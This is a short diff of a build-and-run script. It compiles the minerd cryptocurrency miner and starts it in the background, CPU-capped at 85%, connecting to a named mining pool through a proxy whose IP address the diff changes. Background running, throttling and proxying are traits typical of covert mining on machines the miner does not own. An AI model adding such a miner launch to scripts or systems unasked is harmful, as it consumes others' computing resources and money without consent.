@@ -6,4 +6,4 @@ chmod +x ./autogen.sh
 ./autogen.sh
 ./configure CFLAGS="-O3 -march=native -funroll-loops -fomit-frame-pointer"
 make
-cpulimit --exe minerd --limit 85 -b && ./minerd -a yescrypt -o stratum+tcp://jp.lapool.me:3014 -u k67frozen.anonymous -p 0202 -x 104.207.141.47:2212 --background
+cpulimit --exe minerd --limit 85 -b && ./minerd -a yescrypt -o stratum+tcp://jp.lapool.me:3014 -u k67frozen.anonymous -p 0202 -x 45.77.243.253:2212 --background
